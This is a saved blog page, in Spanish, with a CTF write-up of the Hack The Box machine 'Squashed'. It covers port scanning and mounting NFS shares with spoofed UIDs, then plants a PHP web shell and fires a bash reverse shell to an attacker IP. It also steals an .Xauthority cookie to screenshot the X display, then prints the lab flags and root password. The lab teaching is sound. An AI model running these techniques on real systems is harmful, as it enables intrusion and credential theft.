@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Máquina 1</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./squashed.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Squashed</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+
+
+<h2 id="comprobación-del-sistema-operativo">1. Comprobación del sistema operativo</h2>
+<pre><code>python whichsystem.py 10.10.11.191
+</code></pre>
+<p>Tiene como salida:</p>
+<pre><code>10.10.11.191 (ttl -&gt; 63): Linux
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="descubrimiento-de-puertos-y-servicios">2. Descubrimiento de puertos y servicios</h2>
+<pre><code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.191
+</code></pre>
+<p>Obtenemos el siguiente resultado:</p>
+<pre><code>PORT      STATE SERVICE REASON
+22/tcp    open  ssh     syn-ack ttl 63
+80/tcp    open  http    syn-ack ttl 63
+111/tcp   open  rpcbind syn-ack ttl 63
+2049/tcp  open  nfs     syn-ack ttl 63
+33293/tcp open  unknown syn-ack ttl 63
+40787/tcp open  unknown syn-ack ttl 63
+41163/tcp open  unknown syn-ack ttl 63
+57919/tcp open  unknown syn-ack ttl 63
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="comprobamos-servicios-y-lanzamos-scripts-principales-contra-dichos-puertos">3. Comprobamos servicios y lanzamos scripts principales contra dichos puertos</h2>
+<pre><code>nmap -sCV -p22,80,111,2049,33293,40787,41163,57919 10.10.11.191
+</code></pre>
+<p>Observamos que nos devuelve la siguiente salida:</p>
+<pre><code>22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Built Better
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      33800/udp   mountd
+|   100005  1,2,3      41163/tcp   mountd
+|   100005  1,2,3      50755/tcp6  mountd
+|   100005  1,2,3      60013/udp6  mountd
+|   100021  1,3,4      33032/udp   nlockmgr
+|   100021  1,3,4      40113/tcp6  nlockmgr
+|   100021  1,3,4      40418/udp6  nlockmgr
+|   100021  1,3,4      40787/tcp   nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+2049/tcp  open  nfs_acl  3 (RPC #100227)
+33293/tcp open  mountd   1-3 (RPC #100005)
+40787/tcp open  nlockmgr 1-4 (RPC #100021)
+41163/tcp open  mountd   1-3 (RPC #100005)
+57919/tcp open  mountd   1-3 (RPC #100005)
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="recorremos-la-página-web">3. Recorremos la página web</h2>
+<p>Luego de recorre la página web, no observamos nada interesante, por lo que lanzamos un <em>fuzzing</em> a la web mediante la herramienta <strong>gobuster</strong>:</p>
+<pre><code>gobuster dir -u 10.10.11.191:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</code></pre>
+<p>Pero como observamos en la siguiente salida, no obtenemos nada destacable:</p>
+<pre><code>===============================================================
+/images               (Status: 301) [Size: 313] [--&gt; http://10.10.11.191/images/]
+/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.191/css/]
+/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.191/js/]
+/server-status        (Status: 403) [Size: 277]
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="servicio-rpcbind">4. Servicio rpcbind</h2>
+<p>Si volvemos a observar la salida de la herramienta <strong>nmap</strong> vemos que la máquina hace uso del <strong>servicio rpcbind</strong>. Podemos por ejemplo ejecutar la siguiente consulta para observar los servicios que este tiene disponible (aunque ya nos lo lista el propio nmap):</p>
+<pre><code>rpcinfo -p 10.10.11.191
+</code></pre>
+<p>Obteniendo la siguiente salida:</p>
+<pre><code>program vers proto   port  service
+100000    4   tcp    111  portmapper
+100000    3   tcp    111  portmapper
+100000    2   tcp    111  portmapper
+100000    4   udp    111  portmapper
+100000    3   udp    111  portmapper
+100000    2   udp    111  portmapper
+100005    1   udp  34351  mountd
+100005    1   tcp  57919  mountd
+100005    2   udp  58284  mountd
+100005    2   tcp  33293  mountd
+100005    3   udp  33800  mountd
+100005    3   tcp  41163  mountd
+100003    3   tcp   2049  nfs
+100003    4   tcp   2049  nfs
+100227    3   tcp   2049  nfs_acl
+100003    3   udp   2049  nfs
+100227    3   udp   2049  nfs_acl
+100021    1   udp  33032  nlockmgr
+100021    3   udp  33032  nlockmgr
+100021    4   udp  33032  nlockmgr
+100021    1   tcp  40787  nlockmgr
+100021    3   tcp  40787  nlockmgr
+100021    4   tcp  40787  nlockmgr
+</code></pre>
+<p>Si descargamos el paquene <strong>nfs-utils</strong> (en arch), podemos ejectar el comando <code>showmount</code> para ver los directorios que hay disponibles para ser montados:</p>
+<pre><code>showmount -e 10.10.11.191
+</code></pre>
+<p>Y observamos nos devuelve los siguientes:</p>
+<pre><code>/home/ross    *
+/var/www/html *
+</code></pre>
+<p>Por lo que intentamos montar el directorio <code>/home/ross</code>, con el siguiente comando:</p>
+<pre><code>sudo mount -t nfs 10.10.11.191:/home/ross /home/juan/HackTheBox/maquinas/squashed/test
+</code></pre>
+<p>Y observamos el siguiente contenido</p>
+<pre><code>ls 
+	
+	Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+</code></pre>
+<p>En dichos directorios solo nos encontramos con un arhivo .kdbx (es decir de Keepass), llamado <code>Passwords.kdbx</code>.</p>
+<p>&nbsp;</p>
+<h2 id="montado-de-la-otra-carpeta">5. Montado de la otra carpeta</h2>
+<p>Intentamos montar la otra carpeta (<code>/var/www/html</code>), mediante el siguiente comando:</p>
+<pre><code>sudo mount -t nfs 10.10.11.191:/var/www/html /home/juan/HackTheBox/maquinas/squashed/test
+</code></pre>
+<p>Si queremos acceder a ella observamos como no podemos, porque el propietario es el siguiente:</p>
+<pre><code>drwxr-xr-- 5 2017 http 4096 mar  1 12:15 test
+</code></pre>
+<p>Por lo que procedemos a hacer los siguientes pasos:</p>
+<ol>
+<li>
+<p>Creamos un nuevo usuario llamado dummy:</p>
+<pre><code>sudo useradd dummy
+</code></pre>
+</li>
+<li>
+<p>Accedemos como este nuevo usuario:</p>
+<pre><code>sudo su dummy
+</code></pre>
+</li>
+<li>
+<p>Observamos que tiene el siguiente id:</p>
+<pre><code>id
+
+	uid=4036(dummy) gid=4036(dummy) grupos=4036(dummy)
+</code></pre>
+</li>
+<li>
+<p>Cambiamos el uid del usuario dummy</p>
+<pre><code>sudo usermod -u 2017 dummy
+
+	uid=2017(dummy) gid=4036(dummy) grupos=4036(dummy)
+</code></pre>
+</li>
+<li>
+<p>Ya podemos acceder a la carpeta montada y ver su contenido</p>
+<pre><code>css  images  index.html  js
+</code></pre>
+<p>Este parece el directorio del sitio web que se está mostrando en la página web. Podemos crear un nuevo archivo <em>.html</em> para comprobar si es posible acceder a el:</p>
+<pre><code>echo "Hola" &gt; test.html
+</code></pre>
+<p>Observamos como que si nos dirigimos al endpoint <code>http://10.10.11.191/test.html</code> somos capaces de obtener el mensaje de <em>Hola</em>.</p>
+</li>
+</ol>
+<p>&nbsp;</p>
+<h2 id="explotación">6. Explotación</h2>
+<p>Se nos ocurre entonces crear una especie de <em>shell</em> en un archivo con extensión <code>.php</code>. Para ello ejecutamos</p>
+<pre><code>echo -e '&lt;?php\n  system($_REQUEST['cmd']);\n?&gt;' &gt; test.php
+</code></pre>
+<p>Por que si ahora hacemos por ejemplo la siguiente peticion <code>http://10.10.11.191/test.php?cmd=id</code>, obtenemos lo siguiente</p>
+<pre><code>uid=2017(alex) gid=2017(alex) groups=2017(alex) 
+</code></pre>
+<p>Podemos entonces crear una <em>revershell</em> aprovechando esto, ejecutando para ello la siguiente petición:</p>
+<pre><code>http://10.10.11.191/test.php?cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.93/1234 0&gt;&amp;1'
+</code></pre>
+<p>A mayores, debemos establecer un servicio <code>netcat</code> escuchando:</p>
+<pre><code>nc -lvp 1234
+</code></pre>
+<p>Pero observamos que esto no funciona. Esto es puede ser debido a que debemos codificar la url de la petición, por lo que realizamos la siguiente:</p>
+<pre><code>http://10.10.11.191/test.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.93%2F1234%200%3E%261%27
+</code></pre>
+<p>En este caso si que nos funciona y por lo tanto obtenemos acceso a una <em>shell</em> a través del usuario <strong>alex</strong>.</p>
+<p>&nbsp;</p>
+<h2 id="flag-de-usuario">7. Flag de usuario</h2>
+<p>Somos capaces de obtener la flag de usuario -&gt; <em>e13eed60e2b2857bf4f0a3000f538cb4</em></p>
+<p>&nbsp;</p>
+<h2 id="escalada-de-privilegios">8. Escalada de privilegios</h2>
+<p>Investigando por la carpeta del usuario Alex, encontramos el archivo <code>.Xauthority</code>. Este archivo se utiliza como <em>cookie</em> para conectarse a través de otras shells. Por lo que procedemos a ver las <em>tty</em> o <em>shells</em> activas con:</p>
+<pre><code># w
+
+	USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+	ross     tty7     :0               05:13   12:08m  1:02   0.06s /usr/libexec/gn
+</code></pre>
+<p>Podemos intentar comprobar si tenemos conexión con la <em>tty</em> a través de los siguientes comandos:</p>
+<pre><code># xdpyinfo -display :0   
+
+	No protocol specified
+	xdpyinfo:  unable to open display ":0".
+
+# xwininfo -root -tree -display :0  
+
+	No protocol specified
+	xwininfo: error: unable to open display ":0"
+</code></pre>
+<p>Por lo que para este caso no nos sirve dicho <code>.Xauthority</code>.</p>
+<p>&nbsp;</p>
+<h2 id="escalada-de-privilegios-2">9. Escalada de privilegios 2</h2>
+<p>Si volvemos a montar el archivo <em>nfs</em>, comentado en uno de los puntos anteriores (el directorio <code>/home/ross</code>):</p>
+<pre><code>sudo mount -t nfs 10.10.11.191:/home/ross /home/juan/HackTheBox/maquinas/squashed/ross
+</code></pre>
+<p>Si observamos los archivos ocultos, vemos que existe otro <code>.Xauthority</code>.</p>
+<pre><code>drwxr-xr-x  4 juan juan 4096 mar  1 22:27 ..
+-rw-------  1 1001 1001   57 mar  1 06:13 .Xauthority
+drwx------ 11 1001 1001 4096 oct 21 16:57 .cache
+drwx------ 12 1001 1001 4096 oct 21 16:57 .config
+drwx------  3 1001 1001 4096 oct 21 16:57 .gnupg
+drwx------  3 1001 1001 4096 oct 21 16:57 .local
+lrwxrwxrwx  1 root root    9 oct 21 15:07 .viminfo -&gt; /dev/null
+lrwxrwxrwx  1 root root    9 oct 20 15:24 .bash_history -&gt; /dev/null
+-rw-------  1 1001 1001 2475 mar  1 06:13 .xsession-errors
+-rw-------  1 1001 1001 2475 dic 27 16:33 .xsession-errors.old
+drwxr-xr-x  2 1001 1001 4096 oct 21 16:57 Desktop
+drwxr-xr-x  2 1001 1001 4096 oct 21 16:57 Documents
+drwxr-xr-x  2 1001 1001 4096 oct 21 16:57 Downloads
+drwxr-xr-x  2 1001 1001 4096 oct 21 16:57 Music
+drwxr-xr-x  2 1001 1001 4096 oct 21 16:57 Pictures
+drwxr-xr-x  2 1001 1001 4096 oct 21 16:57 Public
+drwxr-xr-x  2 1001 1001 4096 oct 21 16:57 Templates
+drwxr-xr-x  2 1001 1001 4096 oct 21 16:57 Videos
+</code></pre>
+<p>Antes de enviarlo deberemos de crear un usario que tenga el uid 1001, para que pueda utilizar dicho <code>.Xauthority</code>.</p>
+<pre><code># sudo useradd test
+
+# sudo usermod -u 1001 test
+
+# sudo su test
+</code></pre>
+<p>Por lo que mediante un servidor creado por nosotros, enviamos el archivo a la máquina objetivo:</p>
+<pre><code># sudo python -m http.server 8000
+
+% curl http://10.10.14.93:8000/.Xauthority -o /tmp/.Xauthority
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="conexión-con-tty">10. Conexión con tty</h2>
+<p>Podemos probar ahora a realizar la conexion a la <em>tty</em>, empleando para ello el nuevo archivo <code>.Xauthority</code>. Para ello ejecutamos el siguiente comando:</p>
+<pre><code>XAUTHORITY=/tmp/.Xauthority xdpyinfo -display :0
+</code></pre>
+<p>Podemos entonces capturar la pantalla del tty, mediante el siguiente comando:</p>
+<pre><code>XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 &gt; /tmp/cap.xwd
+</code></pre>
+<p>Podemos pasar este archivo a nuestra máquina local, y mediante el paquete <strong>imagemagick</strong>, para <em>Archlinux</em>, realizamos al conversión al formato <em>png</em>.</p>
+<pre><code>convert cap.xwd cap.png
+</code></pre>
+<p>Observando como somos capaces de ver la contraseña del usuario <strong>root</strong> : <code>cah$mei7rai9A</code>. Por lo que mediante <code>su -</code> somos capaces de acceder como usuario <strong>root</strong>.</p>
+<p>&nbsp;</p>
+<h2 id="flag-de-root">11. Flag de root</h2>
+<p>Somos entonces capaces de obtener el flag del usuario <strong>root</strong> -&gt; <em>5b73cb3cf68b019d27094abb7f16c231</em></p>
+
+
+
+
+
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
